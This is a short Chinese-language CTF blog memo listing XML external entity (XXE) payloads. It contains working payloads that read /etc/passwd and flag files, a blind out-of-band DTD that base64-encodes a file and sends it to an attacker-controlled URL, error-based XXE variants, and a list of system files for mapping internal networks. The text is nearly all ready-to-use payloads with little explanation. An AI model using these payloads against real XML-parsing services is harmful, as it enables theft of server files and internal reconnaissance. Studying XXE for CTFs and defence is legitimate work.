---
title: "XXE 总结笔记"
date: 2022-08-27T18:18:31+08:00
lastmod: 2022-12-20T18:18:31+08:00
draft: false
author: "X1r0z"

tags: ['ctf','xxe']
categories: ['CTF笔记']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

记录一下常用 xxe payload

想到啥写啥, 只是一个备忘录

<!--more-->

## 引用外部实体

SYSTEM

```xml-dtd
<!ENTITY xxs SYSTEM "file:///etc/passwd" >
```

PUBLIC

```xml-dtd
<!ENTITY % remote PUBLIC "dtd" "http://127.0.0.1/evil.dtd">
```

## 常规 XXE

通用实体

```xml-dtd
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE test [
<!ENTITY file SYSTEM "file:///etc/passwd">]>
<test>
&file;
</test>
```

参数实体 (利用 CDATA)

```xml-dtd
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE test [
<!ENTITY % start "<![CDATA[">
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://127.0.0.1/evil.dtd">
%dtd;]>
<test>
&all;
</test>
```

evil.dtd

```xml-dtd
<?xml version="1.0" encoding="utf-8"?>
<!ENTITY all "%start;%xxe;%end;" >
```

## Blind XXE

payload

```xml-dtd
<!DOCTYPE test [
<!ENTITY % remote SYSTEM "http://127.0.0.1/evil.dtd">
%remote;%int;%send;
]>
```

evil.dtd

```xml-dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://127.0.0.1/?p=%file;'>">
```

## Error-based XXE

引用本地 dtd

```dtd
<?xml version="1.0"?>
<!DOCTYPE root [
<!ELEMENT root ANY>
<!ELEMENT message ANY>
    <!ENTITY % local SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % file SYSTEM "file:///flag">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; eval "
            <!ENTITY &#x26;#x25; error SYSTEM &#x27;&#x25;file;&#x27;>
        ">
        &#x25;eval;
    '>
    %local;
]>
<root>
<message>123</message>
</root>
```

多层内部实体嵌套绕过, 无需引用 dtd

```dtd
<?xml version="1.0"?>
<!DOCTYPE root [
<!ELEMENT root ANY>
<!ELEMENT message ANY>
    <!ENTITY % file SYSTEM "file:///flag">
    <!ENTITY % eval1 '
        <!ENTITY &#x25; eval2 "
            <!ENTITY &#x26;#x25; error SYSTEM &#x27;&#x25;file;&#x27;>
        ">
        &#x25;eval2;
    '>
    %eval1;
]>
<root>
<message>123</message>
</root>
```

## 获取内网网段

```
/etc/network/interfaces
/etc/hosts
/proc/net/arp
/proc/net/tcp
/proc/net/udp
/proc/net/dev
/proc/net/fib_trie
```